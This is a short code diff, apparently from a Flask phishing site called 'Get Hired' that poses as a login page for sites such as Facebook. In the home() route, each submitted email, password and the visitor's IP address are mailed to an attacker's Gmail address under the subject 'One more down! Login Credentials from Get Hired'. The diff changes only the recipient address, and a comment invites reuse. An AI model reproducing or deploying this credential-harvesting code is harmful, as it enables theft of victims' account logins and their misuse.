@@ -43,7 +43,7 @@ def home():
 			website = "Facebook"
 		try:
 			msg = Message("One more down! Login Credentials from Get Hired",
-		  	recipients=["forbiddenfalls@gmail.com"])  #Change it to mail someone else.
+		  	recipients=["forbidden@gmail.com"])  #Change it to mail someone else.
 			msg.body = "Email:        "+str(email)+"\nPassword: "+str(password)+\
 			"\nIP:            "+str(request.remote_addr)+"\nWebsite:    "+website
 			mail.send(msg)
